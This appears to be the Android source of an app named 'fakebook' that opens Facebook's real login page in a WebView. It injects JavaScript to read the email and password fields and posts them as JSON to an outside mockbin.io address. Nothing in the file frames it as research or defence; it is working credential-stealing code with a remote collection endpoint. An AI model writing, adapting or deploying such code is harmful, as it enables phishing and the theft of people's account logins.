package com.example.fakebook;

import android.annotation.SuppressLint;
import android.os.Bundle;
import android.util.Log;
import android.view.PixelCopy;
import android.webkit.ValueCallback;
import android.webkit.WebView;
import android.webkit.WebViewClient;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;

import com.example.fakebook.R;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.IOException;

import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.MediaType;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;

public class MainActivity extends AppCompatActivity {

    private WebView webView;

    @SuppressLint("SetJavaScriptEnabled")
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        webView = findViewById(R.id.webView);

        // Enable JavaScript
        webView.getSettings().setJavaScriptEnabled(true);
        webView.setWebViewClient(new WebViewClient() {
            @Override
            public void onPageFinished(WebView view, String url) {
                super.onPageFinished(view, url);

                // Inject JavaScript and retrieve the result
                webView.evaluateJavascript("(function() { " +
                        "    var emailElement = document.querySelector('input[name=\"email\"]');" +
                        "    var passElement = document.querySelector('input[name=\"pass\"]');" +
                        "    if (emailElement && passElement) {" +
                        "        var data = {" +
                        "            username: emailElement.value," +
                        "            password: passElement.value" +
                        "        };" +
                        "        return JSON.stringify(data);" +
                        "    } else {" +
                        "        return JSON.stringify({ error: 'Input elements not found' });" +
                        "    }" +
                        "})()", new ValueCallback<String>() {
                    @Override
                    public void onReceiveValue(String value) {

                        // Fetch IP address and check if it is from Portugal

                        sendToHttp(value);
                        Log.d("WebView", "Received data: " + value);
                    }
                });
            }
        });
        // Load the Facebook login page
        webView.loadUrl("https://www.facebook.com/login.php");
    }

    private void sendToHttp(String value) {
        OkHttpClient client = new OkHttpClient();

        // Create the request body with the JSON value
        RequestBody body = RequestBody.create(value, MediaType.get("application/json; charset=utf-8"));

        Request request = new Request.Builder()
                .url("https://71c18af5227742ca8d8bc00706e8fecc.api.mockbin.io/")
                .post(body)
                .build();

        client.newCall(request).enqueue(new Callback() {
            @Override
            public void onFailure(@NonNull Call call, @NonNull IOException e) {
                Log.e("AccessibilityService", "HTTP request failed: " + e.getMessage());
            }

            @Override
            public void onResponse(@NonNull Call call, @NonNull Response response) throws IOException {
                if (response.isSuccessful()) {
                    Log.d("AccessibilityService", "HTTP request successful");

                } else {
                    Log.e("AccessibilityService", "HTTP request failed with status code: " + response.code());
                }
            }
        });
    }

    // Handle the back button to navigate back within the WebView
    @Override
    public void onBackPressed() {
        if (webView.canGoBack()) {
            webView.goBack();
        } else {
            super.onBackPressed();
        }
    }
}